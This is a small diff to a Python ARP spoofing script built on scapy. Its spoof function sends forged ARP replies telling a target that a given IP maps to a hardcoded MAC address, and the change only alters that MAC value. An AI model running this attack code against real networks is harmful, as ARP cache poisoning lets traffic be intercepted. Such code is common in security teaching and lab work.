@@ -10,7 +10,7 @@ def get_arguments():
     return parser.parse_args()
 
 def spoof(target_ip, spoof_ip):
-    arp_packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwsrc="aa:bb:cc:44:55:66")
+    arp_packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwsrc="aa:bb:cc:44:55:77")
     scapy.send(arp_packet, verbose=False)
 
 def run_spoofer():
